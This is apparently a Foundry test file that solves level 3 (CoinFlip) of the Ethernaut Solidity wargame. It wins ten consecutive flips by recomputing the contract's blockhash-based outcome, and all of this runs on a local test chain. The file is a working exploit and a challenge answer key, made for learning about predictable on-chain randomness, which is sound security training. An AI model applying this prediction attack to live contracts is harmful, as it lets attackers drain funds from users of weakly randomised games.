// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/console2.sol";
import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "../src/levels/03-CoinFlip/CoinFlipFactory.sol";

contract CoinFlipTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1); // generate random-looking address with given private key

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        vm.deal(hacker, 1 ether);
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(levelAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 lastHash;
        uint256 consecutiveWins;

        while (consecutiveWins < 10) {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                vm.roll(block.number + 1);
                continue;
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            ethernautCoinFlip.flip(side);
            ++consecutiveWins;
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
